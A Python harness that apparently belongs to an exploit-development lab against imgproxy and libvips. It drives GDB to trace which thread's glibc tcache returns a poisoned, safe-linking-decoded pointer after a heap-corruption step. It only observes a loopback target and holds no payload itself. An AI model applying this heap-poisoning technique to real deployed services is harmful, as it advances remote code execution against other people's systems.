#!/usr/bin/env python3
"""W11: identify which thread's tcache a natural malloc(0x20) actually uses.

Loopback only. Reuses the committed W9 probe verbatim, replacing only its GDB
script. SIZE=0x35 preserves the victim chunk size so the W9 aborting free does
not fire. At every 0x20 malloc hit the script prints the current thread, the
address of that thread's `tcache`, its bin-1 head/count, then the return value
and whether it equals the wire-decoded head. GDB only observes: breakpoints,
`finish` and `continue`; no memory writes, no forced calls.

Usage:
    W8_OUTDIR=/tmp/out python3 ico_tcache_thread_probe.py TAG LOW N PRELOAD gdb SIZE BINARY
"""
import importlib.util
import sys

PROBE = ("/home/mesh-home/mishe-tauftauf2shell/lab/frontier/imgproxy2shell/"
         "provision/ico_post_poison_trace.py")

HEAD = """set pagination off
set confirm off
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND 127.0.0.1:18180
set environment IMGPROXY_BASE_URL http://127.0.0.1:18181/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL error
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "GDB_HIT rdx=%p\\n", $rdx
set $dst = $rsi
set $base = $dst - 14
printf "GDB_BASE %p ACTUAL %p\\n", $base, $dst
finish
printf "GDB_TCACHE_PRE head=%p count=%d thread=%d tcache=%p\\n", tcache->entries[1], tcache->counts[1], $_thread, tcache
set $pos = $dst + 18
set $raw = *(unsigned long long *)$pos
set $wire = (void *)($raw ^ ((unsigned long)$pos >> 12))
printf "GDB_WIRE_DECODED %p RAW %p POS %p\\n", $wire, $raw, $pos
set $victim_thread = $_thread
set $victim_tcache = tcache
set $poisoned = 1
break malloc if $rdi == 0x20
continue
"""

TAIL = """quit
"""

body = []
for i in range(1, 11):
    body.append(f'printf "GDB_M{i}_HIT size=%p thread=%d tcache=%p head=%p count=%d\\n", '
                f'$rdi, $_thread, tcache, tcache->entries[1], tcache->counts[1]\n')
    body.append('finish\n')
    body.append(f'printf "GDB_M{i}_RET %p WIRE=%d thread=%d\\n", $rax, '
                '(unsigned long)$rax == (unsigned long)$wire, $_thread\n')
    body.append(f'printf "GDB_M{i}_TCACHE_AFTER thread=%d tcache=%p head=%p count=%d\\n", '
                '$_thread, tcache, tcache->entries[1], tcache->counts[1]\n')
    if i < 10:
        body.append('continue\n')
GDB = HEAD + "".join(body) + TAIL

spec = importlib.util.spec_from_file_location("w9probe", PROBE)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
mod.GDB = GDB
sys.exit(mod.main())
